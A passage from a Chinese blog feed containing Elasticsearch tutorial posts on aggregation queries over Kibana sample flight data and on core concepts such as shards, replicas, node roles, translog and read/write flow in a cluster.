class="headerlink" title="Bucket &amp; Metric"></a>Bucket &amp; Metric</h3><ul><li>Metric - 一些系统的统计方法（类似 count）</li><li>Bucket - 一组满足条件的文档（group by）</li></ul><p><img src="/images/big-data/es-03/35.jpg" alt="35"></p><h4 id="Bucket"><a href="#Bucket" class="headerlink" title="Bucket"></a>Bucket</h4><ul><li>一些例子<ul><li>杭州属于浙江 / 演员是男或女</li><li>嵌套关系 - 杭州属于浙江属于中国属于亚洲</li></ul></li><li>ES 提供了许多的类型的 Bucket，帮助用多种方式划分文档<ul><li>Tern &amp; Range (时间 / 年龄区间 / 地理位置)</li></ul></li></ul><p><img src="/images/big-data/es-03/36.jpg" alt="36"></p><h4 id="Metric"><a href="#Metric" class="headerlink" title="Metric"></a>Metric</h4><ul><li>Metric 会基于数据集计算结果，除了支持在字段上进行计算，同样也支持在脚本（painless script）产生的结果之上进行计算</li><li>大多数 Metric 是数学计算，仅输出一个值<ul><li>min / max / sum / avg /cardinality</li></ul></li><li>部分 metric 支持输出多个数值<ul><li>stats / percentiles / percentile_ranks</li></ul></li></ul><h3 id="一个-Bucket-例子"><a href="#一个-Bucket-例子" class="headerlink" title="一个 Bucket 例子"></a>一个 Bucket 例子</h3><p><img src="/images/big-data/es-03/37.jpg" alt="37"></p><p><img src="/images/big-data/es-03/38.jpg" alt="38"></p><p><img src="/images/big-data/es-03/39.jpg" alt="39"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要通过Kibana导入Sample Data的飞机航班数据。</span></span><br><span class="line"><span class="comment">// 按照目的地进行分桶统计</span></span><br><span class="line">GET kibana_sample_data_flights/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"aggs"</span>:&#123;</span><br><span class="line"><span class="attr">"flight_dest"</span>:&#123;</span><br><span class="line"><span class="attr">"terms"</span>:&#123;</span><br><span class="line"><span class="attr">"field"</span>:<span class="string">"DestCountry"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看航班目的地的统计信息，增加平均，最高最低价格</span></span><br><span class="line">GET kibana_sample_data_flights/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"aggs"</span>:&#123;</span><br><span class="line"><span class="attr">"flight_dest"</span>:&#123;</span><br><span class="line"><span class="attr">"terms"</span>:&#123;</span><br><span class="line"><span class="attr">"field"</span>:<span class="string">"DestCountry"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"aggs"</span>:&#123;</span><br><span class="line"><span class="attr">"avg_price"</span>:&#123;</span><br><span class="line"><span class="attr">"avg"</span>:&#123;</span><br><span class="line"><span class="attr">"field"</span>:<span class="string">"AvgTicketPrice"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"max_price"</span>:&#123;</span><br><span class="line"><span class="attr">"max"</span>:&#123;</span><br><span class="line"><span class="attr">"field"</span>:<span class="string">"AvgTicketPrice"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"min_price"</span>:&#123;</span><br><span class="line"><span class="attr">"min"</span>:&#123;</span><br><span class="line"><span class="attr">"field"</span>:<span class="string">"AvgTicketPrice"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 价格统计信息+天气信息</span></span><br><span class="line">GET kibana_sample_data_flights/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"aggs"</span>:&#123;</span><br><span class="line"><span class="attr">"flight_dest"</span>:&#123;</span><br><span class="line"><span class="attr">"terms"</span>:&#123;</span><br><span class="line"><span class="attr">"field"</span>:<span class="string">"DestCountry"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"aggs"</span>:&#123;</span><br><span class="line"><span class="attr">"stats"</span>:&#123;</span><br><span class="line"><span class="attr">"field"</span>:<span class="string">"AvgTicketPrice"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"wather"</span>:&#123;</span><br><span class="line">  <span class="attr">"terms"</span>: &#123;</span><br><span class="line">    <span class="attr">"field"</span>: <span class="string">"DestWeather"</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">5</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.elastic.co/cn/blog/moving-from-types-to-typeless-apis-in-elasticsearch-7-0" target="_blank" rel="noopener">为什么不再支持单个Index下，多个Tyeps</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/cat-indices.html" target="_blank" rel="noopener">CAT Index API</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/cluster.html" target="_blank" rel="noopener">Cluster API</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/cat-shards.html" target="_blank" rel="noopener">CAT Shards API</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/docs.html" target="_blank" rel="noopener">Document API</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/mapping-params.html" target="_blank" rel="noopener">Mapping Parameters</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/indices-templates.html" target="_blank" rel="noopener">Index Templates</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/dynamic-mapping.html" target="_blank" rel="noopener">Dynamic Template</a></li><li>《Elasticsearch核心技术与实战》</li><li><a href="https://zh.wikipedia.org/wiki/%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95</a></li><li><a href="https://www.elastic.co/guide/cn/elasticsearch/guide/current/inverted-index.html" target="_blank" rel="noopener">https://www.elastic.co/guide/cn/elasticsearch/guide/current/inverted-index.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/indices-analyze.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/indices-analyze.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/analyzer-anatomy.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/analyzer-anatomy.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-search.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-search.html</a></li><li><a href="https://searchenginewatch.com/sew/news/2065080/search-engines-101" target="_blank" rel="noopener">https://searchenginewatch.com/sew/news/2065080/search-engines-101</a></li><li><a href="https://www.huffpost.com/entry/search-engines-101-part-i_b_1104525" target="_blank" rel="noopener">https://www.huffpost.com/entry/search-engines-101-part-i_b_1104525</a></li><li><a href="https://www.entrepreneur.com/article/176398" target="_blank" rel="noopener">https://www.entrepreneur.com/article/176398</a></li><li><a href="https://www.searchtechnologies.com/meaning-of-relevancy" target="_blank" rel="noopener">https://www.searchtechnologies.com/meaning-of-relevancy</a></li><li><a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E5%B1%95%E5%8F%B2/2422574" target="_blank" rel="noopener">https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E5%B1%95%E5%8F%B2/2422574</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.0/search-uri-request.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.0/search-uri-request.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.0/search-search.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.0/search-search.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-aggregations.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-aggregations.html</a></li></ul><style>  img {    zoom: 50%;  }</style>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Elasticsearch 是使用 Java 编写的一种开源搜索引擎，它在内部使用 Luence 做索引与搜索，通过对 Lucene 的封装，提供了一套简单一致的 RESTful API。&lt;/p&gt;
&lt;p&gt;Elasticsearch 也是一种分布式的搜索引擎架构，可以很简单地扩展到上百个服务节点，并支持 PB 级别的数据查询，使系统具备高可用和高并发性。&lt;/p&gt;
&lt;p&gt;本文介绍 Elasticsearch 基本概念和常用REST API。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 Elasticsearch 核心概念</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-02/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-02/</id>
    <published>2021-01-31T13:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.666Z</updated>
    
    <content type="html"><![CDATA[<p>Elasticsearch 是使用 Java 编写的一种开源搜索引擎，它在内部使用 Luence 做索引与搜索，通过对 Lucene 的封装，提供了一套简单一致的 RESTful API。</p><p>Elasticsearch 也是一种分布式的搜索引擎架构，可以很简单地扩展到上百个服务节点，并支持 PB 级别的数据查询，使系统具备高可用和高并发性。</p><p>本文介绍 Elasticsearch 核心概念和索引写入过程。</p><a id="more"></a><h2 id="ES-核心概念"><a href="#ES-核心概念" class="headerlink" title="ES 核心概念"></a>ES 核心概念</h2><p>Elasticsearch 的核心概念如下：</p><ul><li><p><strong>Cluster</strong>：集群，由一个或多个 Elasticsearch 节点组成。</p></li><li><p><strong>Node</strong>：节点，组成 Elasticsearch 集群的服务单元，同一个集群内节点的名字不能重复。通常在一个节点上分配一个或者多个分片。</p></li><li><p><strong>Shards</strong>：分片，当索引上的数据量太大的时候，我们通常会将一个索引上的数据进行水平拆分，拆分出来的每个数据库叫作一个分片。</p><ul><li><p>在一个多分片的索引中写入数据时，通过路由来确定具体写入那一个分片中，所以在创建索引时需要指定分片的数量，并且分片的数量一旦确定就不能更改。</p></li><li><p>分片后的索引带来了规模上（数据水平切分）和性能上（并行执行）的提升。每个分片都是 Luence 中的一个索引文件，每个分片必须有一个主分片和零到多个副本分片。</p></li></ul></li><li><p><strong>Replicas</strong>：备份也叫作副本，是指对主分片的备份。主分片和备份分片都可以对外提供查询服务，写操作时先在主分片上完成，然后分发到备份上。</p><ul><li>当主分片不可用时，会在备份的分片中选举出一个作为主分片，所以备份不仅可以提升系统的高可用性能，还可以提升搜索时的并发性能。但是若副本太多的话，在写操作时会增加数据同步的负担。</li></ul></li><li><p><strong>Index</strong>：索引，由一个和多个分片组成，通过索引的名字在集群内进行唯一标识。</p></li><li><p><strong>Type</strong>：类别，指索引内部的逻辑分区，通过 Type 的名字在索引内进行唯一标识。在查询时如果没有该值，则表示在整个索引中查询。</p></li><li><p><strong>Document</strong>：文档，索引中的每一条数据叫作一个文档，类似于关系型数据库中的一条数据通过 _id 在 Type 内进行唯一标识。</p></li><li><p><strong>Settings</strong>：对集群中索引的定义，比如一个索引默认的分片数、副本数等信息。</p></li><li><p><strong>Mapping</strong>：类似于关系型数据库中的表结构信息，用于定义索引中字段（Field）的存储类型、分词方式、是否存储等信息。Elasticsearch 中的 Mapping 是可以动态识别的。</p><ul><li>如果没有特殊需求，则不需要手动创建 Mapping，因为 Elasticsearch 会自动根据数据格式识别它的类型，但是当需要对某些字段添加特殊属性（比如：定义使用其他分词器、是否分词、是否存储等）时，就需要手动设置 Mapping 了。一个索引的 Mapping 一旦创建，若已经存储了数据，就不可修改了。</li></ul></li><li><p><strong>Analyzer</strong>：字段的分词方式的定义。一个 Analyzer 通常由一个 Tokenizer、零到多个 Filter 组成。</p><ul><li>比如默认的标准 Analyzer 包含一个标准的 Tokenizer 和三个 Filter：Standard Token Filter、Lower Case Token Filter、Stop Token Filter。</li></ul></li></ul><h2 id="Elasticsearch-的节点的分类如下"><a href="#Elasticsearch-的节点的分类如下" class="headerlink" title="Elasticsearch 的节点的分类如下"></a>Elasticsearch 的节点的分类如下</h2><p><strong>主节点（Master Node）</strong>：也叫作主节点，主节点负责创建索引、删除索引、分配分片、追踪集群中的节点状态等工作。Elasticsearch 中的主节点的工作量相对较轻。</p><p>用户的请求可以发往任何一个节点，并由该节点负责分发请求、收集结果等操作，而并不需要经过主节点转发。</p><p>通过在配置文件中设置 node.master=true 来设置该节点成为候选主节点（但该节点不一定是主节点，主节点是集群在候选节点中选举出来的），在 Elasticsearch 集群中只有候选节点才有选举权和被选举权。其他节点是不参与选举工作的。</p><p><strong>数据节点（Data Node）</strong>：数据节点，负责数据的存储和相关具体操作，比如索引数据的创建、修改、删除、搜索、聚合。</p><p>所以，数据节点对机器配置要求比较高，首先需要有足够的磁盘空间来存储数据，其次数据操作对系统 CPU、Memory 和 I/O 的性能消耗都很大。</p><p>通常随着集群的扩大，需要增加更多的数据节点来提高可用性。通过在配置文件中设置 node.data=true 来设置该节点成为数据节点。</p><p><strong>客户端节点（Client Node）</strong>：就是既不做候选主节点也不做数据节点的节点，只负责请求的分发、汇总等，也就是下面要说到的协调节点的角色。</p><p>其实任何一个节点都可以完成这样的工作，单独增加这样的节点更多地是为了提高并发性。<br>可在配置文件中设置该节点成为数据节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node.master=<span class="literal">false</span></span><br><span class="line">node.data=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p><strong>部落节点（Tribe Node）</strong>：部落节点可以跨越多个集群，它可以接收每个集群的状态，然后合并成一个全局集群的状态。</p><p>它可以读写所有集群节点上的数据，在配置文件中通过如下设置使节点成为部落节点：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tribe:</span>  </span><br><span class="line">  <span class="attr">one:</span> </span><br><span class="line">    <span class="attr">cluster.name:</span> <span class="string">cluster_one</span></span><br><span class="line">  <span class="attr">two:</span> </span><br><span class="line">    <span class="attr">cluster.name:</span> <span class="string">cluster_two</span></span><br></pre></td></tr></table></figure><blockquote><p>因为 Tribe Node 要在 Elasticsearch 7.0 以后移除，所以不建议使用。</p></blockquote><p><strong>协调节点（Coordinating Node）</strong>：协调节点，是一种角色，而不是真实的 Elasticsearch 的节点，我们没有办法通过配置项来配置哪个节点为协调节点。集群中的任何节点都可以充当协调节点的角色。</p><p>当一个节点 A 收到用户的查询请求后，会把查询语句分发到其他的节点，然后合并各个节点返回的查询结果，最好返回一个完整的数据集给用户。</p><p>在这个过程中，节点 A 扮演的就是协调节点的角色。由此可见，协调节点会对 CPU、Memory 和 I/O 要求比较高。</p><p>集群的状态有 Green、Yellow 和 Red 三种，如下所述：</p><ul><li><p><strong>Green</strong>：绿色，健康。所有的主分片和副本分片都可正常工作，集群 100% 健康。</p></li><li><p><strong>Yellow</strong>：黄色，预警。所有的主分片都可以正常工作，但至少有一个副本分片是不能正常工作的。此时集群可以正常工作，但是集群的高可用性在某种程度上被弱化。</p></li><li><p><strong>Red</strong>：红色，集群不可正常使用。集群中至少有一个分片的主分片及它的全部副本分片都不可正常工作。</p><ul><li>这时虽然集群的查询操作还可以进行，但是也只能返回部分数据（其他正常分片的数据可以返回），而分配到这个分片上的写入请求将会报错，最终会导致数据的丢失。</li></ul></li></ul><h2 id="3C-和脑裂"><a href="#3C-和脑裂" class="headerlink" title="3C 和脑裂"></a>3C 和脑裂</h2><p><strong>共识性（Consensus）</strong></p><p>共识性是分布式系统中最基础也最主要的一个组件，在分布式系统中的所有节点必须对给定的数据或者节点的状态达成共识。</p><p>虽然现在有很成熟的共识算法如 Raft、Paxos 等，也有比较成熟的开源软件如 Zookeeper。</p><p>但是 Elasticsearch 并没有使用它们，而是自己实现共识系统 zen discovery。</p><p><strong>Elasticsearch 之父 Shay Banon 解释了其中主要的原因：</strong>“zen discovery 是 Elasticsearch 的一个核心的基础组件，zen discovery 不仅能够实现共识系统的选择工作，还能够很方便地监控集群的读写状态是否健康。当然，我们也不保证其后期会使用 Zookeeper 代替现在的 zen discovery”。</p><p>zen discovery 模块以 “八卦传播”（Gossip）的形式实现了单播（Unicat）：单播不同于多播（Multicast）和广播（Broadcast）。节点间的通信方式是一对一的。</p><p><strong>并发（Concurrency）</strong></p><p>Elasticsearch 是一个分布式系统。写请求在发送到主分片时，同时会以并行的形式发送到备份分片，但是这些请求的送达时间可能是无序的。</p><p>在这种情况下，Elasticsearch 用乐观并发控制（Optimistic Concurrency Control）来保证新版本的数据不会被旧版本的数据覆盖。</p><p>乐观并发控制是一种乐观锁，另一种常用的乐观锁即多版本并发控制（Multi-Version Concurrency Control）。</p><p>它们的主要区别如下：</p><ul><li><p><strong>乐观并发控制（OCC）</strong>：是一种用来解决写 - 写冲突的无锁并发控制，认为事务间的竞争不激烈时，就先进行修改，在提交事务前检查数据有没有变化，如果没有就提交，如果有就放弃并重试。乐观并发控制类似于自选锁，适用于低数据竞争且写冲突比较少的环境。</p></li><li><p><strong>多版本并发控制（MVCC）</strong>：是一种用来解决读 - 写冲突的无所并发控制，也就是为事务分配单向增长的时间戳，为每一个修改保存一个版本，版本与事务时间戳关联，读操作只读该事务开始前的数据库的快照。</p><ul><li>这样在读操作不用阻塞操作且写操作不用阻塞读操作的同时，避免了脏读和不可重复读。</li></ul></li></ul><p><strong>一致性（Consistency）</strong></p><p>Elasticsearch 集群保证写一致性的方式是在写入前先检查有多少个分片可供写入，如果达到写入条件，则进行写操作，否则，Elasticsearch 会等待更多的分片出现，默认为一分钟。</p><p>有如下三种设置来判断是否允许写操作：</p><ul><li><p><strong>One</strong>：只要主分片可用，就可以进行写操作。</p></li><li><p><strong>All</strong>：只有当主分片和所有副本都可用时，才允许写操作。</p></li><li><p><strong>Quorum（k-wu-wo/reng，法定人数）</strong>：是 Elasticsearch 的默认选项。当有大部分的分片可用时才允许写操作。其中，对 “大部分” 的计算公式为 int ((primary+number_of_replicas)/2)+1。</p></li></ul><p>Elasticsearch 集群保证读写一致性的方式是，为了保证搜索请求的返回结果是最新版本的文档，备份可以被设置为 Sync（默认值），写操作在主分片和备份分片同时完成后才会返回写请求的结果。</p><p>这样，无论搜索请求至哪个分片都会返回最新的文档。但是如果我们的应用对写要求很高，就可以通过设置 replication=async 来提升写的效率，如果设置 replication=async，则只要主分片的写完成，就会返回写成功。</p><p><strong>脑裂</strong></p><p>在 Elasticsearch 集群中主节点通过 Ping 命令来检查集群中的其他节点是否处于可用状态，同时非主节点也会通过 Ping 来检查主节点是否处于可用状态。</p><p>当集群网络不稳定时，有可能会发生一个节点 Ping 不通 Master 节点，则会认为 Master 节点发生了故障，然后重新选出一个 Master 节点，这就会导致在一个集群内出现多个 Master 节点。</p><p>当在一个集群中有多个 Master 节点时，就有可能会导致数据丢失。我们称这种现象为脑裂。</p><h2 id="事务日志"><a href="#事务日志" class="headerlink" title="事务日志"></a>事务日志</h2><p>Lucene 为了加快写索引的速度，采用了延迟写入的策略。</p><p>虽然这种策略提高了写入的效率，但其最大的弊端是，如果数据在内存中还没有持久化到磁盘上时发生了类似断电等不可控情况，就可能丢失数据。</p><p>为了避免丢失数据，Elasticsearch 添加了事务日志（Translog），事务日志记录了所有还没有被持久化磁盘的数据。</p><p>Elasticsearch 写索引的具体过程如下：首先，当有数据写入时，为了提升写入的速度，并没有数据直接写在磁盘上，而是先写入到内存中，但是为了防止数据的丢失，会追加一份数据到事务日志里。</p><p>因为内存中的数据还会继续写入，所以内存中的数据并不是以段的形式存储的，是检索不到的。</p><p>总之，Elasticsearch 是一个准实时的搜索引擎，而不是一个实时的搜索引擎。</p><p>此时的状态如图所示：</p><p><img src="/images/big-data/es-02/1.jpg" alt="1"></p><p>然后，当达到默认的时间（1 秒钟）或者内存的数据达到一定量时，会触发一次刷新（Refresh）。</p><p>刷新的主要步骤如下：</p><ul><li><p>将内存中的数据刷新到一个新的段中，但是该段并没有持久化到硬盘中，而是缓存在操作系统的文件缓存系统中。虽然数据还在内存中，但是内存里的数据和文件缓存系统里的数据有以下区别。</p><ul><li>内存使用的是 JVM 的内存，而文件缓存系统使用的是操作系统的内存；内存的数据不是以段的形式存储的，并且可以继续向内存里写数据。文件缓存系统中的数据是以段的形式存储的，所以只能读，不能写；内存中的数据是搜索不到，文件缓存系统中的数据是可以搜索的。</li></ul></li><li><p>打开保存在文件缓存系统中的段，使其可被搜索。</p></li><li><p>清空内存，准备接收新的数据。日志不做清空处理。</p></li></ul><p>此时的状态如图所示：</p><p><img src="/images/big-data/es-02/2.jpg" alt="2"></p><p>最后，刷新（Flush）。当日志数据的大小超过 512MB 或者时间超过 30 分钟时，需要触发一次刷新。</p><p>刷新的主要步骤如下：</p><ul><li>在文件缓存系统中创建一个新的段，并把内存中的数据写入，使其可被搜索。</li><li>清空内存，准备接收新的数据。</li><li>将文件系统缓存中的数据通过 Fsync 函数刷新到硬盘中。</li><li>生成提交点。</li><li>删除旧的日志，创建一个空的日志。</li></ul><p>此时的状态如图所示：</p><p><img src="/images/big-data/es-02/3.jpg" alt="3"></p><p>由上面索引创建的过程可知，内存里面的数据并没有直接被刷新（Flush）到硬盘中，而是被刷新（Refresh）到了文件缓存系统中，这主要是因为持久化数据十分耗费资源，频繁地调用会使写入的性能急剧下降。</p><p>所以 Elasticsearch，为了提高写入的效率，利用了文件缓存系统和内存来加速写入时的性能，并使用日志来防止数据的丢失。</p><p>在需要重启时，Elasticsearch 不仅要根据提交点去加载已经持久化过的段，还需要根据 Translog 里的记录，把未持久化的数据重新持久化到磁盘上。</p><p>根据上面对 Elasticsearch，写操作流程的介绍，我们可以整理出一个索引数据所要经历的几个阶段，以及每个阶段的数据的存储方式和作用，如图所示：</p><p><img src="/images/big-data/es-02/4.jpg" alt="4"></p><h2 id="在集群中写索引"><a href="#在集群中写索引" class="headerlink" title="在集群中写索引"></a>在集群中写索引</h2><p>假设我们有如图所示（图片来自官网）的一个集群，该集群由三个节点组成（Node 1、Node 2 和 Node 3），包含一个由两个主分片和每个主分片由两个副本分片组成的索引。</p><p><img src="/images/big-data/es-02/5.jpg" alt="5"></p><p>其中，标星号的 Node 1 是 Master 节点，负责管理整个集群的状态；p1 和 p2 是主分片；r0 和 r1 是副本分片。为了达到高可用，Master 节点避免将主分片和副本放在同一个节点。</p><p>将数据分片是为了提高可处理数据的容量和易于进行水平扩展，为分片做副本是为了提高集群的稳定性和提高并发量。</p><p>在主分片挂掉后，会从副本分片中选举出一个升级为主分片，当副本升级为主分片后，由于少了一个副本分片，所以集群状态会从 Green 改变为 Yellow，但是此时集群仍然可用。</p><p>在一个集群中有一个分片的主分片和副本分片都挂掉后，集群状态会由 Yellow 改变为 Red，集群状态为 Red 时集群不可正常使用。</p><p>由上面的步骤可知，副本分片越多，集群的可用性就越高，但是由于每个分片都相当于一个 Lucene 的索引文件，会占用一定的文件句柄、内存及 CPU，并且分片间的数据同步也会占用一定的网络带宽，所以，索引的分片数和副本数并不是越多越好。</p><p>写索引时只能写在主分片上，然后同步到副本上，那么，一个数据应该被写在哪个分片上呢？</p><p>如图所示，如何知道一个数据应该被写在 p0 还是 p1 上呢答案就是路由（routing），路由公式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shard = <span class="built_in">hash</span>(routing)%number_of_primary_shards</span><br></pre></td></tr></table></figure><p>其中，Routing 是一个可选择的值，默认是文档的 _id（文档的唯一主键，文档在创建时，如果文档的 _id 已经存在，则进行更新，如果不存在则创建）。</p><p>后面会介绍如何通过自定义 Routing 参数使查询落在一个分片中，而不用查询所有的分片，从而提升查询的性能。</p><p>Routing 通过 Hash 函数生成一个数字，将这个数字除以 number_of_primary_shards（分片的数量）后得到余数。</p><p>这个分布在 0 到 number_of_primary_shards - 1 之间的余数，就是我们所寻求的文档所在分片的位置。</p><p>这也就说明了一旦分片数定下来就不能再改变的原因，因为分片数改变之后，所有之前的路由值都会变得无效，前期创建的文档也就找不到了。</p><p>由于在 Elasticsearch 集群中每个节点都知道集群中的文档的存放位置（通过路由公式定位），所以每个节点都有处理读写请求的能力。</p><p>在一个写请求被发送到集群中的一个节点后，此时，该节点被称为协调点（Coordinating Node），协调点会根据路由公式计算出需要写到哪个分片上，再将请求转发到该分片的主分片节点上。</p><p><img src="/images/big-data/es-02/6.jpg" alt="6"></p><p>写操作的流程如下：</p><ul><li><p>客户端向 Node 1（协调节点）发送写请求。</p></li><li><p>Node 1 通过文档的 _id（默认是 _id，但不表示一定是 _id）确定文档属于哪个分片（在本例中是编号为 0 的分片）。请求会被转发到主分片所在的节点 Node 3 上。</p></li><li><p>Node 3 在主分片上执行请求，如果成功，则将请求并行转发到 Node 1 和 Node 2 的副本分片上。</p></li><li><p>一旦所有的副本分片都报告成功（默认），则 Node 3 将向协调节点报告成功，协调节点向客户端报告成功。</p></li></ul><h2 id="集群中的查询流程"><a href="#集群中的查询流程" class="headerlink" title="集群中的查询流程"></a>集群中的查询流程</h2><p>根据 Routing 字段进行的单个文档的查询，在 Elasticsearch 集群中可以在主分片或者副本分片上进行。</p><p><img src="/images/big-data/es-02/7.jpg" alt="7"></p><p>查询字段刚好是 Routing 的分片字段如 “_id” 的查询流程如下：</p><ul><li><p>客户端向集群发送查询请求，集群再随机选择一个节点作为协调点（Node 1），负责处理这次查询。</p></li><li><p>Node 1 使用文档的 routing id 来计算要查询的文档在哪个分片上（在本例中落在了 0 分片上）分片 0 的副本分片存在所有的三个节点上。</p></li><li><p>在这种情况下，协调节点可以把请求转发到任意节点，本例将请求转发到 Node 2 上。</p></li><li><p>Node 2 执行查找，并将查找结果返回给协调节点 Node 1，Node 1 再将文档返回给客户端。</p></li></ul><p>当一个搜索请求被发送到某个节点时，这个节点就变成了协调节点（Node 1）。</p><p>协调节点的任务是广播查询请求到所有分片（主分片或者副本分片），并将它们的响应结果整合成全局排序后的结果集合。</p><p>由上面步骤 3 所示，默认返回给协调节点并不是所有的数据，而是只有文档的 id 和得分 score，因为我们最后只返回给用户 size 条数据，所以这样做的好处是可以节省很多带宽，特别是 from 很大时。</p><p>协调节点对收集回来的数据进行排序后，找到要返回的 size 条数据的 id，再根据 id 查询要返回的数据，比如 title、content 等。</p><p><img src="/images/big-data/es-02/8.jpg" alt="8"></p><p>取回数据等流程如下：</p><ul><li><p>Node 3 进行二次排序来找出要返回的文档 id，并向相关的分片提交多个获得文档详情的请求。</p></li><li><p>每个分片加载文档，并将文档返回给 Node 3。</p></li><li><p>一旦所有的文档都取回了，Node 3 就返回结果给客户端。</p></li></ul><p>协调节点收集各个分片查询出来的数据，再进行二次排序，然后选择需要被取回的文档。</p><p>例如，如果我们的查询指定了 {“from”: 20, “size”: 10}，那么我们需要在每个分片中查询出来得分最高的 20+10 条数据，协调节点在收集到 30×n（n 为分片数）条数据后再进行排序。</p><p>排序位置在 0-20 的结果会被丢弃，只有从第 21 个开始的 10 个结果需要被取回。这些文档可能来自多个甚至全部分片。</p><p>由上面的搜索策略可以知道，在查询时深翻（Deep Pagination）并不是一种好方法。</p><p>因为深翻时，from 会很大，这时的排序过程可能会变得非常沉重，会占用大量的 